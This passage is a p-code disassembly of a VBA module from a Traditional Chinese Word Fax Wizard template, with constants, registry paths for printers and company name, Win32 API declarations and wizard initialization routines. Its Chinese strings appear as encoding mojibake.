' Line #385:
' 	QuoteRem 0x0000 0x0060 "In NT3.51, the printer name from the print set up dialog which is called when the user clicks on"
' Line #386:
' 	QuoteRem 0x0000 0x0046 "Other... , returns the printer name with the printer location after ON"
' Line #387:
' 	QuoteRem 0x0000 0x004D "so if a printer name is \\abcd\efg with location "location1" then the printer"
' Line #388:
' 	QuoteRem 0x0000 0x004D "name is returned a "\\abcd\efg ON location1. So we have to strip out the text"
' Line #389:
' 	QuoteRem 0x0000 0x004F "after ON. That's what this constant is for. In other countries too is this text"
' Line #390:
' 	QuoteRem 0x0000 0x000F "going to be ON?"
' Line #391:
' 	Reparse 0x0032 "Public Const strPRINTER_ON      As String = " ON ""
' Line #392:
' Line #393:
' 	Reparse 0x0042 "Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have"
' Line #394:
' 	QuoteRem 0x0000 0x000E "Error messages"
' Line #395:
' 	Reparse 0x0044 "Public Const strERR_MAX_ADDR_LINES  As String = "¦a§}¤£¥i¶W¹L¤T¦æ¡C""
' Line #396:
' 	Reparse 0x004A "Public Const strERR_NO_DATA_SRC     As String = "ºëÆF§ä¤£¨ì­n¶Ç¯uªº¤å¥ó¡C""
' Line #397:
' 	Reparse 0x0067 "Public Const strERR_CREATING_CMDBAR As String = "ºëÆFµLªk«Ø¥ß¡uSend Fax¡v¤u¨ã¦C¡C ½Ð­«·s°õ¦æ¶Ç¯uºëÆF¡C""
' Line #398:
' 	Reparse 0x0049 "Public Const strERR_NO_MAIN_DOC1     As String = "­n«Ø¥ß«Ê­±ªí³æªº¤å¥ó (""
' Line #399:
' 	Reparse 0x005F "Public Const strERR_NO_MAIN_DOC2     As String = ") ¥¼¶}±Ò¡C½Ð¥ý¶}±Ò¸Ó¤å¥ó¡AµM«á­«·s°õ¦æºëÆF¡I""
' Line #400:
' 	Reparse 0x0050 "Public Const strERR_DISPLAY_QUERY_OPTIONS As String = "ºëÆF§ä¤£¨ì­n¥[¤Jªº¸ê®Æ¡C""
' Line #401:
' 	Reparse 0x004D "Public Const strERR_CHOOSING_DOC As String = "ºëÆFµLªk¿ï¨ú­n¥Î¨Ó¶Ç¯uªº¤å¥ó¡C""
' Line #402:
' 	Reparse 0x007A "Public Const strERR_RCPNTS_NOT_CHOSEN As String = "ºëÆF»Ý­nª¾¹D³o¥÷ªº¦¬¥óªÌ¬O½Ö¡C½Ð«ö¤U¡u½T©w¡v¶s¡AµM«á¿ï¨ú¶Ç¯uªº¦¬¥óªÌ¡C""
' Line #403:
' Line #404:
' 	QuoteRem 0x0000 0x0034 "this tip is displayed in an Autodown balloon finally"
' Line #405:
' 	Reparse 0x00AB "Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C ""
' Line #406:
' 	QuoteRem 0x0000 0x006C "this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients"
' Line #407:
' 	Reparse 0x0108 "Public Const strPOST_WIZARD_TIP_MRG_FLD As String = "½Ð¿é¤J¨ä¥¦±z·Q¼g¦b«Ê­±ªí³æ¤Wªº¸ê®Æ¡AµM«á«ö¤U¦b " & strCMD_BAR_TITLE & " ¤u¥y¦C¤Wªº¡u" & strCMD_BTN_TEXT & "¡v¶s¡C " & "¦ý½Ð¤£­n§R°£¦b¡u<< >>¡v²Å¸¹¤¤ªºÄæ¦ì¡Fµy«á¶Ç¯uºëÆF±N§Q¥Î¥L­Ì¨Ó¶Ç¯u±z«ü©wªº¤å¥ó¨ì¦¬¥óªÌ¤â¤W¡C""
' Line #408:
' Line #409:
' 	QuoteRem 0x0000 0x003D "this message is put up after we successfully faxed everything"
' Line #410:
' 	Reparse 0x0048 "Public Const strMSG_FAX_SUCCESS As String = "ºëÆF¤w±N±zªº¤å¥ó°e¥X¥h¤F¡C""
' Line #411:
' Line #412:
' 	QuoteRem 0x0000 0x0052 "the 72 factor in the below 2 measurements is conversion factor of inches to points"
' Line #413:
' 	QuoteRem 0x0000 0x002F "contemporary styles have a left indent of 0.56""
' Line #414:
' 	Reparse 0x0034 "Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72"
' Line #415:
' 	QuoteRem 0x0000 0x0041 "While converting text to table, for the Contemporary style alone,"
' Line #416:
' 	QuoteRem 0x0000 0x0044 "I need to set the first column's width explicitly. For English text,"
' Line #417:
' 	QuoteRem 0x0000 0x0048 "0.5" is big enough. If the text in the first column is getting truncated"
' Line #418:
' 	QuoteRem 0x0000 0x0032 "in your language, then please increase this value."
' Line #419:
' 	Reparse 0x0033 "Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72"
' Line #420:
' Line #421:
' 	QuoteRem 0x0000 0x0040 "The date format need not be localized if VB does not require it."
' Line #422:
' 	QuoteRem 0x0000 0x0045 "Medium date is of the format "02-Apr-94". If the standard date format"
' Line #423:
' 	QuoteRem 0x0000 0x003C "is anything different in the country, then please change it."
' Line #424:
' 	QuoteRem 0x0000 0x004F "important to have MMMM and not mmmm, since mm refers to minutes in a time field"
' Line #425:
' 	Reparse 0x0036 "Public Const strDATE_FORMAT As String = "MMMM d, yyyy""
' Line #426:
' Line #427:
' 	QuoteRem 0x0000 0x004F "'******************************************************************************"
' Line #428:
' 	QuoteRem 0x0000 0x0036 "DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS"
' Line #429:
' 	QuoteRem 0x0000 0x004F "'******************************************************************************"
' Line #430:
' 	QuoteRem 0x0000 0x0042 "the following are the names of the autotext entries in the wizard."
' Line #431:
' 	QuoteRem 0x0000 0x003D "DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD."
' Line #432:
' 	QuoteRem 0x0000 0x0051 "if you change them, then please change the following strings too, correspondingly"
' Line #433:
' 	Reparse 0x003B "Public Const strAT_UNCHKD_BOX   As String = "Unchecked Box""
' Line #434:
' 	Reparse 0x0039 "Public Const strAT_CHKD_BOX     As String = "Checked Box""
' Line #435:
' 	Reparse 0x0038 "Public Const strCNTMPGFX2        As String = "cntmpgfx2""
' Line #436:
' 	Reparse 0x0045 "Public Const strPOST_WIZ_BLN    As String = "Fax Post Wizard Balloon""
' Line #437:
' Line #438:
' 	Reparse 0x0031 "Public Const sA4_LEFT_MARGIN    As Single = 82.08"
' Line #439:
' 	Reparse 0x0032 "Public Const sA4_RIGHT_MARGIN    As Single = 81.36"
' Line #440:
' 	Reparse 0x002E "Public Const sLETTER_MARGIN     As Single = 90"
' Line #441:
' 	QuoteRem 0x0000 0x0023 "key where setup writes company name"
' Line #442:
' 	Reparse 0x006E "Public Const strREGKEY_CMPNY_NAME As String = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info""
' Line #443:
' 	Reparse 0x003A "Public Const strVALKEY_CMPNY_NAME As String = "DefCompany""
' Line #444:
' Line #445:
' 	Dim (Public) 
' 	VarDefn fDocChanged (As Boolean)
' 	QuoteRem 0x001E 0x0028 "set if user changes the doc. to be faxed"
' Line #446:
' Line #447:
' 	Dim (Public) 
' 	VarDefn objMainDoc (As Document)
' 	QuoteRem 0x001E 0x001D "main doc which has to be sent"
' Line #448:
' 	Dim (Public) 
' 	VarDefn objDataSrc (As MailMergeDataSource)
' 	QuoteRem 0x0029 0x0014 " main doc's data src"
' Line #449:
' Line #450:
' 	QuoteRem 0x0000 0x0037 "SQL query used to select all names from the data source"
' Line #451:
' 	Reparse 0x0039 "Public Const strSELECT_QUERY As String = "Select * From ""
' Line #452:
' Line #453:
' 	QuoteRem 0x0000 0x0023 "form and callback balloon constants"
' Line #454:
' 	Reparse 0x0044 "Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in"
' Line #455:
' 	QuoteRem 0x001D 0x001A "the dialog (starts from 0)"
' Line #456:
' 	Dim (Public) 
' 	OptionBase 
' 	Ld iMAX_PANEL 
' 	VarDefn rgstrAssistantMsg (As String)
' 	QuoteRem 0x0031 0x001C " as many as there are states"
' Line #457:
' Line #458:
' 	Dim (Public) 
' 	VarDefn strBULLET (As String) 0x0015
' Line #459:
' 	Dim (Public) 
' 	VarDefn strSOFT_ENTER (As String)
' Line #460:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn rgstrNotes (As String)
' Line #461:
' 	Dim (Public) 
' 	VarDefn strQUOTE (As String)
' Line #462:
' 	QuoteRem 0x0000 0x0010 "available styles"
' Line #463:
' 	Reparse 0x002E "Public Const iSTY_PROFESSIONAL  As Integer = 0"
' Line #464:
' 	Reparse 0x002E "Public Const iSTY_CONTEMPORARY  As Integer = 1"
' Line #465:
' 	Reparse 0x002E "Public Const iSTY_ELEGANT       As Integer = 2"
' Line #466:
' Line #467:
' 	QuoteRem 0x0000 0x002F "array for holding long and short template names"
' Line #468:
' 	Dim (Public) 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn rgstrTemplateFileNames (As String)
' Line #469:
' 	Reparse 0x0026 "Public Const iLONG_NAME As Integer = 0"
' Line #470:
' 	Reparse 0x0027 "Public Const iSHORT_NAME As Integer = 1"
' Line #471:
' Line #472:
' 	Dim (Public) 
' 	VarDefn iFaxStyle (As Integer)
' 	QuoteRem 0x001C 0x001B "stores the fax style chosen"
' Line #473:
' 	Dim (Public) 
' 	VarDefn fStylesCopied (As Boolean)
' Line #474:
' Line #475:
' 	Dim (Public) 
' 	VarDefn fMSFAXEnabled (As Boolean)
' 	QuoteRem 0x0020 0x000E "disabled in NT"
' Line #476:
' Line #477:
' 	QuoteRem 0x0000 0x000D "Panel numbers"
' Line #478:
' 	Reparse 0x0029 "Public Const iPANEL_RCPNTS As Integer = 3"
' Line #479:
' 	Reparse 0x0029 "Public Const iPANEL_SENDER As Integer = 5"
' Line #480:
' 	Reparse 0x0029 "Public Const iPANEL_STYLE  As Integer = 4"
' Line #481:
' Line #482:
' 	QuoteRem 0x0000 0x0019 "Max. number of recipients"
' Line #483:
' 	Reparse 0x0027 "Public Const iMAX_RCPNTS As Integer = 5"
' Line #484:
' Line #485:
' 	Dim (Public) 
' 	VarDefn fDocIsFormLtr (As Boolean)
' 	QuoteRem 0x0020 0x001D "true if doc. is a form letter"
' Line #486:
' 	QuoteRem 0x0000 0x0049 "to store the data options query that the user selects for the form letter"
' Line #487:
' 	Dim (Public) 
' 	VarDefn strFormLetterSQL (As String)
' Line #488:
' 	Dim (Public) 
' 	VarDefn strFormLetterSQL1 (As String)
' Line #489:
' 	Dim (Public) 
' 	VarDefn strConnectString (As String)
' Line #490:
' 	Dim (Public) 
' 	VarDefn fDocPresent (As Boolean) 0x0015
' 	QuoteRem 0x0020 0x0023 "true if there is an main doc. apart"
' Line #491:
' 	QuoteRem 0x0020 0x001F "from the doc created by FileNew"
' Line #492:
' 	QuoteRem 0x0000 0x0029 "keeps track of which panel to be skipped."
' Line #493:
' 	QuoteRem 0x0000 0x003F "if we are enabling a panel, then we need to restore the shape's"
' Line #494:
' 	QuoteRem 0x0000 0x003A "color to as it was before. rgiColorShape stores that color"
' Line #495:
' 	Dim (Public) 
' 	OptionBase 
' 	Ld iMAX_PANEL 
' 	VarDefn rgfSkipPanel (As Boolean)
' 	QuoteRem 0x002B 0x001B "if rgfSkipPanel(i) is True,"
' Line #496:
' 	QuoteRem 0x002C 0x0017 "then skip the ith panel"
' Line #497:
' 	Dim (Public) 
' 	OptionBase 
' 	Ld iMAX_PANEL 
' 	VarDefn rgiColorShape (As Long)
' Line #498:
' 	Dim (Public) 
' 	VarDefn fCheckValidity (As Boolean)
' Line #499:
' 	Dim (Public) 
' 	VarDefn fNoCovSht (As Boolean)
' 	QuoteRem 0x001C 0x0026 "False if user selects "No cover sheet""
' Line #500:
' Line #501:
' 	Dim (Public) 
' 	VarDefn iFaxOption (As Integer) 0x0018
' 	QuoteRem 0x0023 0x0020 "Fax program selected by the user"
' Line #502:
' 	Reparse 0x0036 "Public Const iMS_FAX    As Integer = 0  'Microsoft Fax"
' Line #503:
' 	Reparse 0x003A "Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax"
' Line #504:
' 	Reparse 0x0056 "Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet"
' Line #505:
' Line #506:
' 	Dim (Public) 
' 	VarDefn fRegistryNamesRead (As Boolean)
' 	QuoteRem 0x0025 0x0028 "true if MRU list has been read from reg."
' Line #507:
' Line #508:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn rgstrFaxTitle (As String) 0x001C
' Line #509:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn rgstrChkBoxText (As String) 0x001C
' 	QuoteRem 0x0026 0x001B "text beside the check boxes"
' Line #510:
' 	Dim (Public) 
' 	VarDefn strAsstMsgRcpntsFormLtr (As String)
' 	QuoteRem 0x0029 0x0030 "assistant help for form letter recipients' panel"
' Line #511:
' 	Dim (Public) 
' 	VarDefn strAsstMsgRcpntsOrdDoc (As String)
' 	QuoteRem 0x0028 0x0032 "assistant help for ordinary doc. recipients' panel"
' Line #512:
' Line #513:
' 	QuoteRem 0x0000 0x003D "tip displayed in an autodown balloon after the wizard is done"
' Line #514:
' 	Dim (Public) 
' 	VarDefn fCreatedCmdBar (As Boolean) 0x0020
' 	QuoteRem 0x002B 0x002E "tip is to be displayed only if cmd bar created"
' Line #515:
' Line #516:
' 	QuoteRem 0x0000 0x0050 "arrays to get the MRU list of recipient names and numbers stored in the registry"
' Line #517:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrMRUFaxNames (As String)
' Line #518:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrMRUFaxNums (As String) 0x0022
' Line #519:
' Line #520:
' 	QuoteRem 0x0000 0x0044 "arrays to get the recipients names and numbers that the user entered"
' Line #521:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrRcpntFaxNames (As String)
' Line #522:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrRcpntFaxNums (As String) 0x0024
' Line #523:
' 	Dim (Public) 
' 	VarDefn iNumRcpnts (As Integer)
' Line #524:
' Line #525:
' 	QuoteRem 0x0000 0x001F "DO NOT LOCALIZE - CONTROL NAMES"
' Line #526:
' 	Reparse 0x003A "Public Const strCBO_RCPNT_NAME  As String = "cboRcpntName""
' Line #527:
' 	Reparse 0x0039 "Public Const strCBO_RCPNT_NUM   As String = "cboRcpntNum""
' Line #528:
' 	Dim (Public) 
' 	VarDefn iCboRcpntNameFocus (As Integer) 0x0020
' Line #529:
' Line #530:
' 	QuoteRem 0x0000 0x0022 "DO NOT LOCALIZE - REGISTRY ENTRIES"
' Line #531:
' 	Reparse 0x0040 "Public Const strRCPNT_NAME      As String = "Name of recipient#""
' Line #532:
' 	Reparse 0x0042 "Public Const strRCPNT_NUMBER    As String = "Number of recipient#""
' Line #533:
' 	Reparse 0x0042 "Public Const strNUM_RCPNTS      As String = "Number of recipients""
' Line #534:
' Line #535:
' 	QuoteRem 0x0000 0x000A "Help files"
' Line #536:
' 	Reparse 0x0037 "Public Const strWIN_HELP_FILE As String = "Windows.hlp""
' Line #537:
' 	Reparse 0x0035 "Public Const strFAX_HELP_FILE As String = "awfax.hlp""
' Line #538:
' Line #539:
' 	QuoteRem 0x0000 0x0015 "contexts for the help"
' Line #540:
' 	Reparse 0x0033 "Public Const lCNTXT_FAX_INSTALL As Long = 461903903"
' Line #541:
' 	Reparse 0x0031 "Public Const lCNTXT_FAX_SEND As Long = 1698757633"
' Line #542:
' 	Reparse 0x003E "Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102"
' Line #543:
' Line #544:
' 	QuoteRem 0x0000 0x0039 "error number that word returns on fax not being installed"
' Line #545:
' 	Reparse 0x0035 "Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663"
' Line #546:
' 	Reparse 0x0030 "Public Const iERR_FAX_NOT_SENT As Integer = 4559"
' Line #547:
' Line #548:
' 	QuoteRem 0x0000 0x0035 "DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS"
' Line #549:
' 	LineCont 0x0004 07 00 00 00
' 	FuncDefn (Declare Function RegEnumKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long)
' Line #550:
' Line #551:
' 	LineCont 0x0004 07 00 00 00
' 	FuncDefn (Declare Function RegOpenKey Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long)
' Line #552:
' Line #553:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long)
' Line #554:
' Line #555:
' 	LineCont 0x0004 12 00 00 00
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32" (ByVal strDir As String, ByVal uSize As Integer) As Integer)
' Line #556:
' Line #557:
' 	LineCont 0x0004 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "USER32" (ByVal strWndClassName As String, ByVal strWndName As String) As Long)
' Line #558:
' Line #559:
' 	LineCont 0x0004 12 00 00 00
' 	FuncDefn (Declare Function WinHelp Lib "USER32" (ByVal hwnd As Long, ByVal strFileName As String, ByVal wCmd As Integer, ByVal dwData As ) As Integer)
' Line #560:
' Line #561:
' Line #562:
' 	Dim (Public) 
' 	VarDefn rgstrPrinterNames (As String) 0x001C
' Line #563:
' 	Dim (Public) 
' 	VarDefn iTotalNumPrinters (As Integer) 0x001C
' Line #564:
' Line #565:
' 	Dim (Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #566:
' 	QuoteRem 0x0000 0x0026 "Const KEY_ALL_ACCESS As Long = &HF0063"
' Line #567:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn ERROR_SUCCESS (As Long)
' Line #568:
' 	Dim (Const) 
' 	LitDI2 0x0103 
' 	VarDefn ERROR_NO_MORE_ITEMS (As Long)
' Line #569:
' Line #570:
' 	QuoteRem 0x0000 0x0031 "registry keys under which printer names are found"
' Line #571:
' 	Dim (Const) 
' 	LitStr 0x0031 "System\CurrentControlSet\Control\Print\Providers\"
' 	VarDefn strREG_PROVIDERS (As String)
' Line #572:
' 	Dim (Const) 
' 	LitStr 0x0030 "System\CurrentControlSet\Control\Print\Printers\"
' 	VarDefn strREG_LOCAL_PRINTERS (As String)
' Line #573:
' Line #574:
' 	QuoteRem 0x0000 0x0036 "initialise the vars. whiehc refer to the wizard's name"
' Line #575:
' 	FuncDefn (Public Sub InitWizardName(fDummy As Boolean))
' Line #576:
' Line #577:
' 	LitStr 0x000C "¤¤¤å¶Ç¯uºëÆF"
' 	St strWizName 
' Line #578:
' 	LitStr 0x000C "¤¤¤å¶Ç¯uºëÆF"
' 	St strWizLongName 
' Line #579:
' 	LitStr 0x0005 "CFax1"
' 	St strWizShortName 
' Line #580:
' Line #581:
' 	EndSub 
' Line #582:
' Line #583:
' 	QuoteRem 0x0000 0x002A "initialize strings specific to this wizard"
' Line #584:
' 	FuncDefn (Private Sub InitWizardStrings())
' Line #585:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #586:
' Line #587:
' 	QuoteRem 0x0004 0x0022 "fax title for the different styles"
' Line #588:
' 	LitStr 0x0008 "¶Ç¯u«H¥ó"
' 	Ld iSTY_CONTEMPORARY 
' 	ArgsSt rgstrFaxTitle 0x0001 
' Line #589:
' 	LitStr 0x000C "¶Ç¯u«H¥óªí³æ"
' 	Ld iSTY_ELEGANT 
' 	ArgsSt rgstrFaxTitle 0x0001 
' Line #590:
' 	LitStr 0x0004 "¶Ç¯u"
' 	Ld iSTY_PROFESSIONAL 
' 	ArgsSt rgstrFaxTitle 0x0001 
' Line #591:
' Line #592:
' 	QuoteRem 0x0004 0x0028 "text appearing after the unchecked boxes"
' Line #593:
' 	LitStr 0x0004 "«æ¥ó"
' 	LitDI2 0x0001 
' 	ArgsSt rgstrChkBoxText 0x0001 
' Line #594:
' 	LitStr 0x0006 "½Ð¬d¾\"
' 	LitDI2 0x0002 
' 	ArgsSt rgstrChkBoxText 0x0001 
' Line #595:
' 	LitStr 0x0006 "½Ð§å¥Ü"
' 	LitDI2 0x0003 
' 	ArgsSt rgstrChkBoxText 0x0001 
' Line #596:
' 	LitStr 0x0006 "½Ð¦^ÂÐ"
' 	LitDI2 0x0004 
' 	ArgsSt rgstrChkBoxText 0x0001 
' Line #597:
' 	LitStr 0x0006 "½Ð¶Ç¾\"
' 	LitDI2 0x0005 
' 	ArgsSt rgstrChkBoxText 0x0001 
' Line #598:
' Line #599:
' 	QuoteRem 0x0004 0x0012 "Assistant messages"
' Line #600:
' 	LitStr 0x0061 "¨Ï¥Î¶Ç¯uºëÆF¡A±z¥i¥H¶Ç¯u¹q¤l¶l¥ó¡A±N«H¥ó¦X¨Ö¨ì¶Ç¯u¤å¥ó¤¤¤@°_¶Ç¯u¡A ©Î±q¶Ç¯u¾÷¤¤¦L¥X¤@±i«Ê­±ªí³æ¡C"
' 	LitDI2 0x0000 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #601:
' 	LitStr 0x0046 "¦pªG±z·Q­n¶Ç¯u¨ä¥¦¤å¥ó¡A½Ð¥ý¶}±Ò±z·Q­n¶Ç¯uªº¤å¥ó¡AµM«á¦A°õ¦æ¶Ç¯uºëÆF¡C"
' 	LitDI2 0x0001 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #602:
' 	LitStr 0x00D6 "¦pªG±zªº§@·~¨t²Î¬O Windows NT¡A«h±zµLªk¨Ï¥Î Microsoft ¶Ç¯u¡A¦ý¬O±zÁÙ¬O¥i¥H¨Ï¥Î¨ä¥¦¤w¦w¸Ë¦b¨t²Î¤¤ªº¶Ç¯u³nÅé¨Ó¬°±z¶Ç¯u¡C¦pªG±zªº¨t²Î¤£¤ä´©¶Ç¯u¥\¯àªº¸Ü¡A¨SÃö«Y¡A±z¥i¥H¥ý±N¤å¥ó¦C¦L¥X¨Ó¡AµM«á¦A§Q¥Î¶Ç¯u¾÷±N¤å¥ó¶Ç¯u¥X¥h¡C"
' 	LitDI2 0x0002 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #603:
' 	LitStr 0x008D "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A«h¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦C¥X±z³Ìªñ¶Ç¯u¹Lªº¤å¥ó¦WºÙ¡C ±z¥i¥H¦b²M³æ¤¤¿ï¨ú¶Ç¯u¹Lªº¤å¥ó¡A±N¨äªþ¦b±zªº«Ê­±ªí³æ¤§«á¤@°_¶Ç¯u¥X¥h¡C"
' 	Ld iPANEL_RCPNTS 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #604:
' 	LitStr 0x002A "½Ð¿é¤J±z·Q¼g¦b«Ê­±ªí³æ¤W¦³Ãö°e¥óªÌªº¸ê®Æ¡C"
' 	Ld iPANEL_SENDER 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #605:
' 	LitStr 0x005A "½Ð¿ï¨ú±z«Ê­±ªí³æ©Ò­nªº®æ¦¡¡C¦b¶Ç¯u¤§«e¡A±zÁÙ¬O¥i¥H§ïÅÜ«Ê­±ªí³æªº¥~Æ[¡A©Î¬O¥[¤J¥²­nªºµù°O¡C"
' 	Ld iPANEL_STYLE 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #606:
' 	LitStr 0x0020 "­n­×§ï¥ô¦ó³]©w¡A½Ð«ö¡u¤W¤@¨B¡v¡C"
' 	Ld iMAX_PANEL 
' 	ArgsSt rgstrAssistantMsg 0x0001 
' Line #607:
' 	QuoteRem 0x0004 0x007E "if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too."
' Line #608:
' 	LitStr 0x008E "½ÐÂI¨ú¡u©m¦W¡vÄæ¦ì¡A¦A¨Ó½ÐÂI¨ú¡u¶Ç¯u¹q¸Ü¡vÄæ¦ì¡A µM«á±q³q°T¿ý¤¤¿ï¨ú­n¥[¤Jªº¦¬¥ó¤H©Î¨ä¶Ç¯u¹q¸Ü¡C ±z¥i¥H¿ï¾Ü¶Ç¯uµ¹¨C¤@­Ó¤H©Î¬O«ü©w¥u¶Ç¯uµ¹¬Y¤H¡C"
' 	St strAsstMsgRcpntsFormLtr 
' Line #609:
' 	LitStr 0x0078 "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A¨º»ò¡u©m¦W¡vÄæ¦ìªº¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦³³Ìªñ¶Ç¯u¹ï¶Hªº¦W¦r¡C±z¥i¥H±q¤¤¿ï¨ú¦¬¥óªÌ©m¦W´¡¤J«Ê­±ªí³æ¤¤¡C"
' 	St strAsstMsgRcpntsOrdDoc 
' Line #610:
' Line #611:
' Line #612:
' 	LitStr 0x000E "±M·~¦¡¶Ç¯u.dot"
' 	Ld iSTY_PROFESSIONAL 
' 	Ld iLONG_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #613:
' 	LitStr 0x000A "cPrfax.dot"
' 	Ld iSTY_PROFESSIONAL 
' 	Ld iSHORT_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #614:
' 	LitStr 0x000E "²{¥N¦¡¶Ç¯u.dot"
' 	Ld iSTY_CONTEMPORARY 
' 	Ld iLONG_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #615:
' 	LitStr 0x000A "cCofax.dot"
' 	Ld iSTY_CONTEMPORARY 
' 	Ld iSHORT_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #616:
' 	LitStr 0x000E "¨å¶®¦¡¶Ç¯u.dot"
' 	Ld iSTY_ELEGANT 
' 	Ld iLONG_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #617:
' 	LitStr 0x000A "cElfax.dot"
' 	Ld iSTY_ELEGANT 
' 	Ld iSHORT_NAME 
' 	ArgsSt rgstrTemplateFileNames 0x0002 
' Line #618:
' Line #619:
' 	LitStr 0x0006 "µù¸Ñ¡G"
' 	Ld iSTY_PROFESSIONAL 
' 	ArgsSt rgstrNotes 0x0001 
' Line #620:
' 	LitStr 0x0006 "µù¸Ñ¡G"
' 	Ld iSTY_CONTEMPORARY 
' 	ArgsSt rgstrNotes 0x0001 
' Line #621:
' 	LitStr 0x0006 "µù¸Ñ¡G"
' 	Ld iSTY_ELEGANT 
' 	ArgsSt rgstrNotes 0x0001 
' Line #622:
' Line #623:
' 	QuoteRem 0x0004 0x0047 "'**********************************************************************"
' Line #624:
' 	QuoteRem 0x0004 0x0022 "DO NOT LOCALIZE BEYOND THIS POINT."
' Line #625:
' 	QuoteRem 0x0004 0x004F "'******************************************************************************"
' Line #626:
' Line #627:
' 	QuoteRem 0x0004 0x0044 "initialize arrays with the color of the subway shapes for the panels"
' Line #628:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld iMAX_PANEL 
' 	For 
' Line #629:
' 	LitVarSpecial (False)
' 	Ld i 
' 	ArgsSt rgfSkipPanel 0x0001 
' Line #630:
' 	Ld COLOR_LIGHTGREY 
' 	Ld i 
' 	ArgsSt rgiColorShape 0x0001 
' Line #631:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #632:
' Line #633:
' 	LitStr 0x0002 "•""
' 	St strBULLET 
' Line #634:
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	St strSOFT_ENTER 
' Line #635:
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	St strQUOTE 
' Line #636:
' Line #637:
' 	QuoteRem 0x0004 0x003E "DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET"
' Line #638:
' 	QuoteRem 0x0004 0x0021 "OF DIALOG VALUES IN THE REGISTRY."
' Line #639:
' 	Ld strREG_SETTINGS_BASE_KEY 
' 	LitStr 0x000A "Fax Wizard"
' 	Concat 
' 	St strRegSettingsKey 
' Line #640:
' 	EndSub 
' Line #641:
' Line #642:
' 	QuoteRem 0x0000 0x0014 "initialises the form"
' Line #643:
' 	FuncDefn (Private Sub InitForm())
' Line #644:
' 	OnError FatalError 
' Line #645:
' Line #646:
' 	SetStmt 
' 	New id_FFFF
' 	Set formWizard 
' Line #647:
' 	Ld formWizard 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #648:
' 	Ld strERR_INIT_FORM 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #649:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #650:
' 	EndIfBlock 
' Line #651:
' Line #652:
' 	LitDI2 0x0000 
' 	St iCurrentPanel 
' Line #653:
' 	LitStr 0x0001 " "
' 	Ld strWizLongName 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld formWizard 
' 	MemLd lblWizardName1 
' 	MemSt Caption 
' Line #654:
' 	ExitSub 
' Line #655:
' Line #656:
' 	Label FatalError 
' Line #657:
' 	Ld strERR_INIT_FORM 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #658:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #659:
' Line #660:
' 	EndSub 
' Line #661:
' Line #662:
' 	FuncDefn (Sub InitWizard(fDummy As Boolean))
